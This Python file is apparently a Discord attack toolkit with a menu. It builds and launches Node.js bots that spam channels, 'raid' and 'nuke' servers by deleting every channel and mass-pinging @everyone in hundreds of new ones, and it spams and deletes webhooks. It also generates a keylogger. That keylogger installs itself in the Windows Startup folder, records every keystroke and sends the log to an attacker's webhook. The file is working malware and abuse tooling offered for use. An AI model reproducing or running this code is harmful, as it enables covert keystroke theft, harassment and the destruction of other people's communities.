
import os
try:
    import dhooks
except:
    os.system("pip install dhooks")
from time import sleep

def yesNo(msg):
    y_or_n = input(msg)
    if y_or_n != "y":
        return False
    else:
        return True



def clear(nmbr):
  for i in range(nmbr):
      print("\n")


#spammerbot
def botspammer():
    token = input("The token of an Administrator bot : ")
    serverid = input("Server ID : ")
    channelid = input("Channel ID : ")
    message = input("Message : ")
    howmany = input("How many spam : ")
    content = """const Discord = require("discord.js")
const Client = new Discord.Client


Client.on("ready", async () =>{
    let guild = Client.guilds.cache.get("serverid")
    let channel = guild.channels.cache.get("channelid")
    let message = "msg"
    for(r = 0; r != howmany; r++){
        channel.send(message)
    }
})

Client.login("token")

"""
    content = str.replace(content, "token", token)
    content = str.replace(content, "serverid", serverid)
    content = str.replace(content, "channelid", channelid)
    content = str.replace(content, "howmany", howmany)
    content = str.replace(content, "msg", message)
    file = open("Spam.js", "w")
    file.write(content)
    file.close()
    os.startfile("Spam.js")
    sleep(0.5)
    os.remove("Spam.js")
    clear(1000)
    panel()


#raid bot
def raid():
  token = input("The token of an Administrator bot : ")
  serverid = input("Server ID : ")
  message = input("Message : ")
  content = """const Discord = require("discord.js")
const Client = new Discord.Client

Client.on("ready", async () =>{
    let guild = Client.guilds.cache.get("serverid")
    let themessage = "msg"
    guild.setName(themessage)

    guild.fetch(guild)
    guild.channels.cache.map(channel => channel.delete())

    for(let count = 0; count != 500; count++){
    let channel = guild.channels.create(themessage)
    ;(await channel).send("@everyone "+themessage)
    ;(await channel).send("@everyone "+themessage)
    ;(await channel).send("@everyone "+themessage)
    ;(await channel).send("@everyone "+themessage)
    ;(await channel).send("@everyone "+themessage)
    }
})

Client.login("token")

"""
  content = str.replace(content, "token", token)
  content = str.replace(content, "serverid", serverid)
  content = str.replace(content, "msg", message)
  file = open("Raid.js", "w")
  file.write(content)
  file.close()
  os.startfile("Raid.js")
  sleep(0.5)
  os.remove("Raid.js")
  clear(1000)
  panel()


#nuke bot
def botnuke():
    token = input("The token of an Administrator bot : ")
    message = input("Message : ")
    content = """const Discord = require("discord.js")
const Client = new Discord.Client

Client.on("ready", async () =>{
    Client.guilds.fetch(Client.guilds)
    for(let r = 0; r < Client.guilds.cache.map(guild => guild).length; r++){
    let guild = Client.guilds.cache.map(guild => guild)[0]
    let themessage = "msg"
    guild.fetch(guild)
    guild.channels.cache.map(channel => channel.delete())

    for(let count = 0; count != 500; count++){
    let channel = guild.channels.create(themessage)
    ;(await channel).send("@everyone "+themessage)
    ;(await channel).send("@everyone "+themessage)
    ;(await channel).send("@everyone "+themessage)
    ;(await channel).send("@everyone "+themessage)
    ;(await channel).send("@everyone "+themessage)
    }
}
})

Client.login("token")

"""
    content = str.replace(content, "token", token)
    content = str.replace(content, "msg", message)
    file = open("Nuke.js", "w")
    file.write(content)
    file.close()
    os.startfile("Nuke.js")
    sleep(0.5)
    os.remove("Nuke.js")
    clear(1000)
    panel()


#webhook spam
def webhookspam():

    webhookurl = input("Url of Webhook : ")
    try:
        webhook = dhooks.Webhook(webhookurl)
    except:
        print("No internet or incorrect link.")
        webhookspam()
    message = input("Message : ")
    file = input("File directory : ")
    howmany = int(input("How many spam : "))
    delay = int(input("Delay (ms) : "))
            

    for i in range(howmany):
        if file != "":
            try:
                fichier_send = dhooks.File(file)
                webhook.send(content=message, file=fichier_send)
            except:
                print("File doesn't exist.")
                webhookspam()
        else:
            webhook.send(message)
        sleep(delay/1000)
        print(f"Spam N°{i} sent")
        clear(1000)
        panel()


#webhooks infos
def webhookinfos():
    webhooklink = input("Webhook Url : ")
    try:
        webhook = dhooks.Webhook(webhooklink)
    except:
        print("No Internet or Invalid Url.")
        webhookdelete()
    print(f"""
    Url : {webhooklink}
    Name : {webhook.get_info().default_name}
    Avatar : {webhook.get_info().default_avatar_url}
    Server ID : {webhook.get_info().guild_id}
    Channel ID : {webhook.get_info().channel_id}""")
    input("Press enter to finish...")
    clear(1000)
    panel()


#delete webhook
def webhookdelete():
    webhooklink = input("Webhook Url : ")
    try:
        webhook = dhooks.Webhook(webhooklink)
    except:
        print("No Internet or Invalid Url.")
        webhookdelete()
    try:
        webhook.delete()
    except:
        pass
    clear(1000)
    panel()



def webhookmessage():

    webhookurl = input("Url of Webhook : ")
    try:
        webhook = dhooks.Webhook(webhookurl)
    except:
        print("No internet or incorrect link.")
        webhookspam()
    message = input("Message : ")
    file = input("File directory : ")  
    if file != "":
        try:
            fichier_send = dhooks.File(file)
            webhook.send(content=message, file=fichier_send)
        except:
            print("File doesn't exist.")
            webhookspam()
    else:
        webhook.send(message)
        clear(1000)
        panel()


#get keylogger file
def keyloggerconfig():
  name = input("Name of the file : ")
  webhooklink = input("Your Webhook Url : ")
  content = """import os
from time import sleep
try:
    from pynput import mouse, keyboard
    from dhooks import *
except:
    os.system("pip install pynput")
    sleep(2)
    os.system("pip install dhooks")
    sleep(2)
import shutil
from os import read, remove, getenv
from os.path import isfile
from threading import Thread
from datetime import *

strlien = "Your Webhooks url"

while True:
    try:
        lien = Webhook(strlien)
        keys = {}

        fichier = f"C:/Users/{getenv('username')}/keys.txt"

        target = f"C:/Users/{getenv('username')}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

        if target != __file__:
            shutil.copy(__file__, target)
            remove(__file__)


        if isfile(fichier):
            try:
                remove(fichier)
            except:
                pass

        def envoi_fichier():
            while True:
                if isfile(fichier):
                    sleep(15)
                    fichier_send = File(fichier)
                    lien.send(file=fichier_send)
                    try:
                        remove(fichier)
                    except:
                        pass





        for i in range(11):
            keys["<" + str(i + 96) + ">"] = str(i)


        def on_press(key):
            key = str(key)

            if key in keys:
                key = keys[key]

            if key[0] == "'" and key[2] == "'":
                key = key[1]

            if key == "Key.ctrl_l":
                key = "ctrl"

            if key == "Key.caps_lock":
                key = "maj_lock"

            if key == "Key.shift":
                key = "shift"

            if key == "Key.enter":
                key = "enter"

            if key == "Key.space":
                key = "space"

            if key == "Key.backspace":
                key = "delete"

            if key == str(r"'\x03'"):
                key = "ctrl_c"

            if key == str(r"'\x16'"):
                key = "ctrl_v"

            if key == str(r"'\x13'"):
                key = "ctrl_s"

            if key == str(r"'\x06'"):
                key = "ctrl_f"

            if key == str(r"'\x08'"):
                key = "ctrl_h"

            if key in keys:
                key = keys[key]

            with open(fichier, 'a') as f:
                f.write(key + "      " +str(datetime.now().time()) + "\\n")
                f.close()

        Thread(target=envoi_fichier).start()


        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except:
        pass
    sleep(2)
"""
  content = str.replace(content, "Your Webhook url", webhooklink)
  file = open(name+".pyw", "w")
  file.write(content)
  file.close()
  print("Done !")
  input("Press enter to finish...")
  clear(1000)
  panel()



def panel():
    print("""
 _____                    _              
|_   _| _   _  _ __    __| | _ __   __ _ 
  | |  | | | || '_ \  / _` || '__| / _` |
  | |  | |_| || | | || (_| || |   | (_| | By Drayxio | V1.3
  |_|   \__,_||_| |_| \__,_||_|    \__,_|
                                         
                                            """)
    print("\n[1] BotSpammer.")
    print("[2] Bot raid.")
    print("[3] Bot nuke.")
    print("[4] WebhookSpammer.")
    print("[5] Webhook infos.")
    print("[6] Delete Webhook.")
    print("[7] Webhook message.")
    print("[8] Get KeyLogger file.")
    mode = input("")
    if mode == "1":
        if yesNo("WARNING ! You must have NodeJs on your computer. Continue ? (y/n) "):
            clear(1000)
            botspammer()
        else:
            clear(1000)
            panel()
    if mode == "2":
        if yesNo("WARNING ! You must have NodeJs on your computer. Continue ? (y/n) "):
            clear(1000)
            raid()
        else:
            clear(1000)
            panel()
    if mode == "3":
        if yesNo("WARNING ! You must have NodeJs on your computer. Continue ? (y/n) "):
            clear(1000)
            botnuke()
        else:
            clear(1000)
            panel()
    if mode == "4":
        clear(1000)
        webhookspam()
    if mode == "5":
        clear(1000)
        webhookinfos()
    if mode == "6":
        clear(1000)
        webhookdelete()
    if mode == "7":
        clear(1000)

    if mode == "8":
        keyloggerconfig()
        



panel()